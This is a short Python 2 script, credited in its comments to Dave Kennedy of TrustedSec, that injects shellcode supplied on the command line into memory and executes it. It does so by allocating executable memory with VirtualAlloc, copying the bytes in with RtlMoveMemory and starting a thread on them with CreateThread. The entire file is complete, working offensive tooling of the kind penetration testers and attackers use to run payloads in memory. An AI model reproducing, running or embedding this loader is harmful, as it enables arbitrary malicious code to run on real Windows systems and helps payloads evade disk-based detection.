#!/usr/bin/python
import ctypes
import sys
# Written by Dave Kennedy (ReL1K) @ TrustedSec.com
# Injects shellcode into memory through Python and ctypes
#
# Initial awesome code and credit found here:
# http://www.debasish.in/2012_04_01_archive.html 

# see if we specified shellcode
try:
    shellcode = sys.argv[1]

# if we didn't specify a param
except IndexError:
    print "Python Shellcode Injector: Written by Dave Kennedy at TrustedSec"
    print "Example: pyinjector.exe \\x41\\x41\\x41\\x41"
    print "Usage: pyinjector.exe <shellcode>"
    sys.exit()

# need to code the input into the right format through string escape
shellcode = shellcode.decode("string_escape")

# convert to bytearray
shellcode = bytearray(shellcode)

# use types windll.kernel32 for virtualalloc reserves region of pages in virtual addres sspace
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

# use virtuallock to lock region for physical address space
ctypes.windll.kernel32.VirtualLock(ctypes.c_int(ptr),
                                   ctypes.c_int(len(shellcode)))

# read in the buffer
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

#  moved the memory in 4 byte blocks
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))
# launch in a thread 
ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))
# waitfor singleobject
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))
